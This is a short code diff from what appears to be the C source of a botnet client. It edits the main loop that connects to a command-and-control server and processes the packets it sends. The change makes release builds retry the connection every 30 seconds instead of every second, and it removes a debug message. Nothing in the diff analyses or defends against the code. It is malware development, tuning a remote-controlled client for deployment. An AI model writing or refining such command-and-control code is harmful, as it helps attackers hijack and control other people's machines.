@@ -25,13 +25,16 @@ _Noreturn void start(char *payload) {
         debug_printf("Connecting to %s:%d", CNC_ADDR, strtol(CNC_PORT, NULL, 10));
 
         while (!cnc_conn_open()) {
+#ifdef DEBUG
             SLEEP(1);
+#else
+            sleep(30);
+#endif
         }
 
         while (is_cnc_connected()) {
             Packet *packet = read_packet();
 
-            debug_printf("yes");
             if (packet == NULL) break;
 
             if (!handle_packet(packet)) {
